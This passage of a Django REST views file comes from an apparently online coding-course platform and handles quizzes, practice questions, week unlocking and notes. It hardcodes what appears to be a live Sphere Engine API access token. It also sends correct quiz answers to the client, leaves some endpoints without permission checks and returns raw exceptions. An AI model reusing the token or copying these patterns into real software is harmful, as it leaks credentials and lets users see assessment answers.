            student_id__in=std_ids,
            question__week__in=week_id,
            question__day__in=day_id
        ).values("id", "question__id", "question__ques_title", "question__week", "compliler_id", "autosave_time")

        previous_attempt = CompilerQuestionAtempt.objects.filter(
            question__practice_mock=False,
            student_id__in=std_ids,
            question__week__in=week_id,
            question__day__in=day_id
        ).values("id", "question__id", "question__ques_title", "question__week", "question__day", "practic_time")

        combined_results = list(chain(pre_code_list, previous_attempt))
        sorted_results = sorted(combined_results, key=lambda x: x.get('autosave_time', x.get('practic_time')), reverse=True)
        last_data = sorted_results[0] if sorted_results else None
        if last_data != None:
            week_val = list(set(last_data["question__week"]))
            all_times_for_week = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week__in=str(week_val)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
            second_dict = all_times_for_week[2]
            first_quiz_info = {
                    "week_value" : second_dict['week'],
                    "start_date_value" : second_dict['start_date'],
                    "start_time_value" : second_dict['start_time'],
                    "course_name_value" : second_dict['batch__course__name'],
                    "topic_value"  : second_dict['topic']
                }
            practice_contest_details.append(first_quiz_info)
            flg.append({"name": course_ids,"course_id":course_id,"type":"practice contest", "last_info": last_data,
                             "status": "Resume", "condition": "", "contest_details": practice_contest_details})
        
        else:
            second_dict = all_times_for_weeks[2]
            first_practice_info = {
                "week_value": second_dict['week'],
                "start_date_value": second_dict['start_date'],
                "start_time_value": second_dict['start_time'],
                "course_name_value": second_dict['batch__course__name'],
                "topic_value": second_dict['topic']
            }
            data.append(first_practice_info)
            flg.append({"name": course_ids,"course_id":course_id,"type":"practice contest", "status": "Start Now","last_info":"", "condition": "", "contest_details": data})
    practice_data ={"practice_test_details":flg}    
    return practice_data 

class QuizSerializer(ModelSerializer):
    class Meta:
        model = Quiz
        fields = '__all__'


class QuizViewSet(ListAPIView):
    """
    A simple ViewSet for listing Quizes.
    """
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    serializer_class = QuizSerializer
    pagination_class = None
    filter_backends = (DjangoFilterBackend,)
    filterset_fields = ('course',)
    queryset = Quiz.objects.all()

class QuizAttemptSerializer(ModelSerializer):
    class Meta:
        model = QuizAttempt
        fields = '__all__'


class QuizUpdateViewSet(ModelViewSet):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    serializer_class = QuizAttemptSerializer
    pagination_class = None
    queryset = Quiz.objects.all()

class QuizQuestionListSerializer(ModelSerializer):
    class Meta:
        model = QuizQuestion 
        exclude = ('quiz',)


class QuizQuestionViewSet(ListAPIView):
    """
    A simple ViewSet for listing QuizQuestiones.
    """

    authentication_classes = (TokenAuthentication,)
    serializer_class = QuizQuestionListSerializer
    pagination_class = None
    filter_backends = (DjangoFilterBackend,)
    filterset_fields = ('quiz',)
    queryset = QuizQuestion.objects.all()

class CompilerQuestionListSerializer(ModelSerializer):
    class Meta:
        model = CompilerQuestion
        # fields = '__all__'
        exclude = (
            'practice_mock',
            'week',
            'day',
            'disable',
            'students'
        )


class CompilerQuestionViewSet(ListAPIView):
    """
    A simple ViewSet for listing CompilerQuestiones.
    """

    authentication_classes = (TokenAuthentication,)
    serializer_class = CompilerQuestionListSerializer
    pagination_class = None
    filter_backends = (DjangoFilterBackend,)
    filterset_fields = (
        'practice_mock',
        'week',
        'day'
    )
    queryset = CompilerQuestion.objects.filter(disable=False)

''' Rina Django'''
class StudentallCourseSerializer(ModelSerializer):
    class Meta:
        model = Course
        fields = '__all__'

class StudentallCourse(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            #new add
            today = datetime.now()
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).filter(Q(batch__revoke_date__gte=today) | Q(batch__revoke_date__isnull=True)).values("batch_id", "batch__course_id")
            print(get_batch)
            if get_batch:
                course_ids = [i["batch__course_id"] for i in get_batch]
                batch_ids = [i["batch_id"] for i in get_batch]
                queryset = Course.objects.filter(id__in=course_ids).order_by("name")
                serializer = StudentallCourseSerializer(queryset, many=True)
                try:
                    course_id = queryset.values("id").first()["id"]
                except:
                    course_id = None
                all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
                course_name = [i["batch__course__name"] for i in all_times]
                course_name = course_name[0] if len(course_name) > 0 else ""
                
                total_week = Course.objects.filter(id=course_id).values("course_duration")[0]["course_duration"]
                week_count = total_week if total_week else 12
                current_datetime = datetime.now()
                formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
                flg = []
                week_conut = []
                for i in all_times :
                    if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                        week_conut.append(i["week"])
                for i in range(1,week_count+1) :

                    if  week_conut.count(str(i)) == 3:                
                        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz__week=str(i)).values("score")
                        get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i))
                        if get_time.exists():
                            get_time=get_time.first()
                            get_max_num_of_attempts = int(get_time.max_num_of_attempts)
                            get_max_score = float(get_time.week_pass_percent)
                            if len(previous_attempt) >= get_max_num_of_attempts or len(previous_attempt) == get_max_num_of_attempts :
                                previous_attempt_score = previous_attempt.aggregate(Max("score"))["score__max"]
                                print("previous_attempt_score", previous_attempt_score)
                                if float(previous_attempt_score) > get_max_score :
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz1.svg","status": "Pass","isDisabled": False})
                                else:
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz1.svg","status": "Fail","isDisabled": False})
                            else:
                                flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz1.svg","status": "Start now","isDisabled": False})
                        else:
                            flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","isDisabled": True})
                    else:
                        flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","isDisabled": True,"total_atm":"", "take_attempt":""})
                return Response({"Main_Course":serializer.data,"week":flg}, status=status.HTTP_200_OK)
            else:
                 return Response({"Main_Course":[],"week":[]}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})


#working on this
class StudentallCourseWeekLock(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            get_quiz = Quiz.objects.filter(course_id=course_id).values("id")
            get_quiz_id = [i["id"] for i in get_quiz]
            batch_ids = [i["batch_id"] for i in get_batch]
            all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
            total_week = Course.objects.filter(id=course_id).values("course_duration")[0]["course_duration"]
            week_count = total_week if total_week else 12
            course_name = [i["batch__course__name"] for i in all_times]
            course_name = course_name[0] if len(course_name) > 0 else ""
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            flg = []
            week_conut = []
            
            for i in all_times :
                if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                    week_conut.append(i["week"])
            for i in range(1,week_count+1) :
                total_exam_attempt = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i)).values("max_num_of_attempts")
                if total_exam_attempt:
                    std_total_attempt = total_exam_attempt[0]["max_num_of_attempts"]
                else:
                    std_total_attempt = 0
                total_questions = QuizQuestion.objects.filter(quiz__course_id = course_id ,quiz__week=str(i)).values("quiz__week","question")
                if  week_conut.count(str(i)) == 3 :
                    # This is for week 1
                    if str(i) == "1" :
                    
                        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("score","attempts")
                        get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i))
                        attempt = [int(attempt['attempts']) for attempt in previous_attempt]
                        if  len(total_questions) > 0:  
                            if previous_attempt.exists():
                                previous_attempt = [int(attempt['score']) for attempt in previous_attempt]
                                max_score = max(previous_attempt, default=None)
                                get_time=get_time.first()
                                get_attempt = len(previous_attempt)
                                db_max_number = get_time.week_pass_percent
                                db_max_attempt = int(get_time.max_num_of_attempts)
                                if float(max_score) >= float(db_max_number) and get_attempt < db_max_attempt:
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Retake","stud_attempt":len(attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition": "","isDisabled": False})
                                elif get_attempt < db_max_attempt :
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Retake","stud_attempt":len(attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition": "","isDisabled": False})
                                else:
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Start now","stud_attempt":len(attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":"your max attempts has been completed, please reach out to support team to unlock this","isDisabled": False})         
                            else:
                                flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Start now","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"isDisabled": False})
                        else:
                            flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":"Reach out to support team to unlock this","isDisabled": False})
                    # This is for week 2,3,4,5,6,7,8
                    else:
                        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("score","attempts")
                        wid = int(i) - 1
                        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(wid)).values("score")
                        get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(wid))
                        current_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("score","attempts")
                        current_get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i))
                        c_attempt = [int(attempt['attempts']) for attempt in current_attempt]
                        get_pass_value = get_time.first()
                    
                        if current_attempt.exists():
                            current_attempt = [int(attempt['score']) for attempt in current_attempt]
                            max_score = max(current_attempt, default=None)
                            get_time=current_get_time.first()
                            get_attempt = len(current_attempt)
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            if float(max_score) >= float(db_max_number) and get_attempt < db_max_attempt:
                                flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Retake","stud_attempt":len(c_attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"isDisabled": False})                              
                            else:
                                if get_attempt < db_max_attempt :
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Retake","stud_attempt":len(c_attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":"","isDisabled": False})
                                else:
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Start now","stud_attempt":len(c_attempt),"max_score":max_score,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":"your max attempts has been completed, please reach out to support team to unlock this","isDisabled": False})

                        elif previous_attempt.exists():
                            previous_attempt = [int(attempt['score']) for attempt in previous_attempt]
                            max_score = max(previous_attempt, default=None)
                            get_time=get_time.first()
                            db_max_number = get_time.week_pass_percent
                            print("db_max_number",db_max_number)
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            get_attempt = len(previous_attempt)
                            if  len(total_questions) > 0:
                                if float(max_score) >= float(db_max_number) or float(max_score) == float(db_max_number) :
                                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Start now","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition": "","isDisabled": False})   
                                else:
                                    if get_attempt >= db_max_attempt and float(max_score) >= float(db_max_number):
                                        flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Start Now","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition": "","isDisabled": False })
                                    else:
                                        flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":f"Please achieve min {db_max_number}% from previous week to unlock this","isDisabled": False})
                            else:
                                flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":"Reach out to support team to unlock this","isDisabled": False})              
                        else:
                            
                            if not get_pass_value:
                                week_pass_percent = 0
                            else:
                                week_pass_percent = get_pass_value.week_pass_percent
                            flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"condition":f"Please achieve min {week_pass_percent}% from previous week to unlock this","isDisabled": False})    
                else:
                    flg.append({"id":i,"week": f"{i}","url": "/images/Quiz/quiz2.svg","status": "Lock","stud_attempt":0,"max_score":0,"total_attempt":total_exam_attempt,"std_total_attempt":std_total_attempt,"isDisabled": True })
            return Response({"course_name":course_name,"week":flg}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})

class StudentCourseQuestions(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            course_id = request.GET.get("course_id")
            week_id= request.GET.get("week_id")
            # same student
            std_id = [i["id"] for i in Student.objects.filter(user_id=request.user.id).values("id")]
            get_quiz = Quiz.objects.filter(course_id=course_id,week=week_id).values("id")
            get_quiz_id = [i["id"] for i in get_quiz]
            previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id).values('quiz__week','questions','attempts','score').order_by("id")   
            chek_max_attempt = QuestionTimer.objects.filter(exam_field="Quiz",week=week_id)
            db_max_qns = chek_max_attempt.first().no_of_questions
            if chek_max_attempt.exists():
                chek_max_attempt = chek_max_attempt.first().max_num_of_attempts
            else:
                chek_max_attempt = 20
            attempts = previous_attempt.last()["attempts"] if previous_attempt.exists() else 0
            previous_attempt_data = {"attempt": attempts}
            if previous_attempt_data["attempt"] == chek_max_attempt :
                return Response({"quiz_id":"","question_data":"","previous_attempt":previous_attempt_data,"alert":f"Maximum {chek_max_attempt} attempts done."}, status=status.HTTP_200_OK)
            # # filter with student week lock/unlock, course
            if previous_attempt.exists() :
                quiz_week = Quiz.objects.filter(course_id=course_id,week=week_id,students__id__in=std_id).values("id")
            else:
                quiz_week = Quiz.objects.filter(course_id=course_id,week=week_id).values("id")
            quiz_id = [i["id"] for i in quiz_week]
            get_previous_question = [i["questions"] for i in previous_attempt]
            #queryset = QuizQuestion.objects.filter(quiz_id__in=quiz_id).exclude(id__in=get_previous_question)
            queryset = QuizQuestion.objects.filter(quiz_id__in=quiz_id)
            selected_questions = random.sample(list(set(queryset)), db_max_qns)
            question_data = []
            id_flg = 1
            answer_key = ""
            for i in selected_questions :
                questionss = i.question
                all_options_lst = str(i.answers)
                result_dict = ast.literal_eval(all_options_lst)
                options_lst = {}
                counter = 0
                for key, value in result_dict.items():
                    if value == True :
                        answer_key = str(key)
                    if counter == 0 :
                        options_lst["a"]=str(key)
                    elif counter == 1 :
                        options_lst["b"]=str(key)
                    elif counter == 2 :
                        options_lst["c"]=str(key)
                    elif counter == 3 :
                        options_lst["d"]=str(key)
                    counter+=1
                statuss = "not-attempted"
                question_data.append({"id":id_flg,"question_id":i.id,"question":questionss.strip(),"answer":answer_key,"status":statuss,"userAnswer": "","options":options_lst})
                id_flg +=1
            return Response({"quiz_id":quiz_id[0],"question_data":question_data,"previous_attempt":previous_attempt_data}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})
        
class StudentCourseQuestionsAttempts(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def post(self, request):
        try:
            question_id = request.data.get("question_id")
            quiz_id = request.data.get("quiz_id")
            answers = request.data.get("ans")
            score = request.data.get("score")
            result = request.data.get("result")
            attempts = request.data.get("attempts")
            questions = str(question_id).split(",")
            answers = str(answers)
            result_dict = ast.literal_eval(answers)
            std_id = [i["id"] for i in Student.objects.filter(user_id=request.user.id).values("id")]
            std_id = std_id[0]
            result = True if result == "pass" else False
            save_q = QuizAttempt(quiz_id=quiz_id,student_id=std_id,passed=result,attempts=attempts,score=score,answers=result_dict)
            save_q.save()
            for i in range(0,2):
                save_q.questions.add(questions[i])

            # Notification part
            course = save_q.quiz.course
            week = save_q.quiz.week
            question_timer = QuestionTimer.objects.filter(exam_field = "Quiz", course=course, week=week).first()
            if score >= question_timer.week_pass_percent and not course.course_duration == week:
                title = f'Next Quiz Unlock'
                current_date = datetime.now().strftime("%d-%m-%Y")
                if week:
                    week_value = int(week) +1
                    message = f"Your {course.name}'s Week - {week_value} quiz test is unlocked.\nDate : {current_date}"
                    notify_user(request.user.id, title, message)

            return Response({"message":"data saved"}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})
    
class QuestionTimerSerializer(ModelSerializer):
    class Meta:
        model = QuestionTimer
        fields = '__all__'

class QuestionTimerView(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    serializer_class = QuestionTimerSerializer
    pagination_class = None
    queryset = QuestionTimer.objects.all()
    
'''Sudip Django'''
accessToken = '3d839c6883687fa7e1db43995c8d60c2'
endpoint = 'https://31c7692b.problems.sphere-engine.com/api/v4/submissions/'


# class StudentallNotesWeekLock(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try:
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
#             batch_ids = [i["batch_id"] for i in get_batch]
#             all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
#             current_datetime = datetime.now()
#             formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
#             week_conut = []
#             for i in all_times :
#                 if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
#                     week_conut.append(i["week"])
#             main_data = []
#             for i in range(1,9) :
#                 if  week_conut.count(str(i)) >= 1 :
#                     std_all_note = Note.objects.filter(course_id=course_id,week=i) 
#                     if std_all_note.exists():
#                         std_all_note = std_all_note.first()
#                         file = f"{std_all_note.file.url}"
#                         main_data.append({"topic":std_all_note.topic,"week":i,"file":file,"week_status":"unlock"})
#                     else:
#                         main_data.append({"topic":"","week":i,"file":"","week_status":"unlock"})
#                 else:
#                     main_data.append({"topic":"","week":i,"file":"","week_status":"lock"})
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})

#add condition
class StudentallNotesWeekLock(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            batch_ids = [i["batch_id"] for i in get_batch]
            all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
            total_week = Course.objects.filter(id=course_id).values("course_duration")[0]["course_duration"]
            week_count = total_week if total_week else 12
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            week_conut = []
            for i in all_times :
                if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                    week_conut.append(i["week"])
            main_data = []
            for i in range(1,week_count+1) :
                if  week_conut.count(str(i)) >= 1 :
                    std_all_note = Note.objects.filter(course_id=course_id,week=i) 
                    if std_all_note.exists():
                        std_all_note = std_all_note.first()
                        file = f"{std_all_note.file.url}"
                        main_data.append({"topic":std_all_note.topic,"week":i,"file":file,"week_status":"unlock","condition":""})
                    else:
                        main_data.append({"topic":"","week":i,"file":"","week_status":"unlock","condition":"no notes at this moment"})
                else:
                    main_data.append({"topic":"","week":i,"file":"","week_status":"lock"})
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})

# #practice
# #new
# def prc_week_first_questions(course_id, week_id):
#     get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False).order_by("day").first()
    
#     if get_q:
#         topics = {"q_id":get_q.id,"title":get_q.ques_title,"slg":get_q.ques_title.replace(" ", "-")}
#     else:
#         topics = {"q_id":None,"title":None,"slg":None}
#     return topics

# #new
# class StudentallPracticeWeekLock(APIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id", "batch__course_id")
#             batch_ids = [i["batch_id"] for i in get_batch]

#             if not course_id:
#                 course_ids = [i["batch__course_id"] for i in get_batch]
#                 queryset = Course.objects.filter(id__in=course_ids).values("id", "name").order_by("name")
#                 course_id = queryset.first()["id"]
#                 course_name = queryset.first()["name"]
#             else:
#                 queryset = Course.objects.filter(id=course_id).values("id", "name")
#                 course_id = queryset.first()["id"]
#                 course_name = queryset.first()["name"]

#             all_times = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids).values(
#                 "week", "start_date", "end_time", "batch__course__name").order_by("id")
#             current_datetime = datetime.now()
#             formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
#             week_count = []
            
#             for j in all_times:
#                 if f"{j['start_date']}-{j['end_time']}" < formatted_datetime:
#                     week_count.append(j["week"])

#             main_data = []
#             for i in range(1, 9):
#                 res_dict = {
#                     "week": i,
#                     "name": course_name,
#                     "img": f"/images/Practice/week{i}.svg",
#                     "status": False,
#                     "completed": 0,
#                     "total": 0,
#                     "condition": ""
#                 }
                
#                 if week_count.count(str(i)) >= 1:
#                     this_week_total_question = CompilerQuestion.objects.filter(practice_mock=False, week=str(i))
#                     this_week_attempt = CompilerQuestionAtempt.objects.filter(
#                         question__practice_mock=False, student_id__in=std_id, question__week=str(i), button_clicked="Submit")

#                     pre_week_total_question = CompilerQuestion.objects.filter(practice_mock=False, week=str(i - 1))
#                     pre_week_attempt = CompilerQuestionAtempt.objects.filter(
#                         question__practice_mock=False, student_id__in=std_id, question__week=str(i - 1), button_clicked="Submit")

#                     res_dict["completed"] = len(this_week_attempt)
#                     res_dict["total"] = len(this_week_total_question)

#                     if i == 1 or len(pre_week_total_question) == 0 or (len(pre_week_attempt) / len(pre_week_total_question)) * 100 >= 50:
#                         res_dict["status"] = True
#                         res_dict["isDisabled"] = False
#                         res_dict["condition"] = ""
#                     else:
#                         res_dict["status"] = False
#                         res_dict["isDisabled"] = False
#                         res_dict["condition"] = "Please achieve a minimum of 50% from the previous week to unlock this"

#                     dict2 = prc_week_first_questions(course_id, str(i))
#                     res_dict.update(dict2)
#                     main_data.append(res_dict)
#                 else:
#                     res_dict["status"] = False
#                     res_dict["isDisabled"] = True
#                     res_dict["condition"] = ""
#                     dict2 = prc_week_first_questions(course_id, str(i))
#                     res_dict.update(dict2)
#                     main_data.append(res_dict)
#             for k in main_data:
#                 if k["total"] == 0:
#                     k["condition"] = "Reach out to support team to unlock this"
#             return Response({"main_data": main_data})
#         except Exception as e:
#             return Response({"error": str(e)})



# class StudentallPracticeQuestionAll(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try :
#             user_id = request.user.id
#             course_id = request.GET.get("course_id")
#             week_id = request.GET.get("week_id")
#             get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False).order_by("day")
#             for_day1 = get_q.filter(day=1)
#             main_data = []
#             topics = []
#             for i in range(1,4):
#                 for_day1 = get_q.filter(day=i)

#                 if for_day1.exists():
#                     for j in for_day1 :
#                         slg = j.ques_title.replace(" ", "-")
#                         topics.append({"q_id":j.id,"title":j.ques_title,"slg":slg, "isOnGoing":True})

#                     main_data.append({"id":i,"day":i,"name":f"day{i}","active":True,"topics":topics})
                    
#                 else:
#                     main_data.append({"id":i,"day":i,"name":f"day{i}","active":False,"topics":[]})
#                 topics = []
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})


# class StudentallPracticeQuestion(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request):
#         try :
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             q_id = request.GET.get("q_id")
#             get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=False).order_by("question_number")
#             #next_questions
#             get_c_q = CompilerQuestion.objects.filter(id=q_id, practice_mock=False).values("week", "course_id")
#             if len(get_c_q) != 0:
#                 week_id = int(get_c_q[0]["week"])
#                 course_id = int(get_c_q[0]["course_id"])
#                 get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False).order_by("day")
#                 get_all_q_id = []
#                 loop_count = 4
#                 for k in range(1, loop_count):
#                     for_day = get_q_all.filter(day=k)
#                     for t in for_day:
#                         get_all_q_id.append(t.id)
#                 next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
#             #end
#             get_course = CompilerQuestion.objects.get(id=q_id, practice_mock=False)
#             get_course.course.name if get_course.course else None
#             socialSitList = []
#             examples = []
#             test_case_list = []

#             for i in get_q :
#                 if i.google :
#                     socialSitList.append("Google") 
#                 if i.amazon :
#                     socialSitList.append("Amazon")
#                 if i.microsoft :
#                     socialSitList.append("Microsoft")
#                 if i.meta :
#                     socialSitList.append("Facebook")
#                 if i.linkedin :
#                     socialSitList.append("Linkedin")
#                 if i.uber :
#                     socialSitList.append("Uber")
#                 if i.adobe :
#                     socialSitList.append("Adobe")
#                 if i.cred :
#                     socialSitList.append("Cred")
                    
#                 #testcases
#                 if i.test_case is not None and len(i.test_case) != 0:
#                     if i.test_case != "null":
#                         try:
#                             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
#                             t_counter = 0
#                             for case_ in test_case_txt:
#                                 t_counter += 1
#                                 caa = str(case_).replace("\r", "").replace("\n", "")
#                                 caaa = caa.split("||")
#                                 case_titel = caaa[0]
                                
#                                 # Split the parts and handle index out of range
#                                 test_case_parts = caaa[1].split("=")
#                                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
#                                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

#                                 target_parts = caaa[2].split("=")
#                                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
#                                 target_value = target_parts[1] if len(target_parts) > 1 else None

#                                 expected_parts = caaa[3].split("=")
#                                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
#                                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

#                                 test_case_list.append({
#                                     "id": t_counter,
#                                     "case_titel": case_titel,
#                                     "test_case_titel": test_case_titel,
#                                     "test_case_value": test_case_value,
#                                     "target_titel": target_titel,
#                                     "target_value": target_value,
#                                     "expected_titel": expected_titel,
#                                     "expected_value": expected_value
#                                 })
#                         except:
#                             test_case_list.append({
#                                     "info":"Please follow The Process"
#                                 })
#                 #examples
#                 try:
#                     exampless = str(i.examples)
#                     lines = exampless.strip().split('\n')
#                     exampless_list = []
#                     for line in lines:
#                         line = line.strip()  # Remove leading and trailing spaces
#                         if line.startswith("Sample Eg") and "||" in line:
#                             exampless_list.append(line)
#                     counter = 0
#                     for j in exampless_list:
#                         ex = str(j).replace("\r","").replace("\n","")
#                         exx = ex.split("||")
#                         title = exx[0]
#                         input = exx[1]
#                         output = exx[2]
#                         explanation = exx[3]
#                         examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
#                         counter +=1
#                 except:
#                     pass
#                 # constrains
#                 constrain =[]    
#                 if i.constraints is not None and len(i.constraints) != 0:
#                     try:
#                         cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
#                         con_counter = 0
#                         for con in cons_txt:
#                             con_counter += 1
#                             conss = str(con).replace("\r", "").replace("\n", "")
#                             nw_cons = conss.split("||")
#                             cons_title = nw_cons[0]
#                             cons_value = nw_cons[1]
#                             constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
#                     except:
#                         constrain.append({
#                                     "info":"Please follow The Process"
#                                 })         
#                 # video solutions
#                 all_videos =[]    
